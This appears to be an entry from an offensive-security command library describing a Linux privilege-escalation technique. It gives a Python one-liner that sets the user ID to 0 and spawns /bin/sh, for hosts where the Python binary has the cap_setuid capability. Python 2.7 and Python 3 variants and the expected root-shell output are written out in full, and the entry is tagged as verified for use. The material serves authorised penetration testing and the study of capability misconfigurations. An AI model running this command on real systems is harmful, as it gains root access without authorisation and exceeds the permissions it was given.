---
id: 717043fe-78aa-4759-bba1-ace51f2396e3
name: python-escalate-to-root-shell
type: command
executor: bash
data: python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
output: null
created_at: '2023-04-06T03:56:18.915411+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - privesc
  - shell
verified: true
validated: true
---

# python-escalate-to-root-shell

## Command

```bash
python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Description

Executes a Python one-liner to set the effective UID to 0 (root) using os.setuid, then spawns a /bin/sh shell. Requires the Python binary to have cap_setuid+ep capability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -c | Execute the following string as code | Built-in |
| 'import os; os.setuid(0); os.system("/bin/sh")' | Python code to escalate and spawn shell | Yes |

## Examples

### Basic Usage

```bash
python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### With Python 3 (If Capable)

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Expected Output

Drops to a root shell prompt:
```
sh-5.0# id
uid=0(root) gid=1000(user)
```

If no capability: Permission denied or no escalation.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Capabilities]]
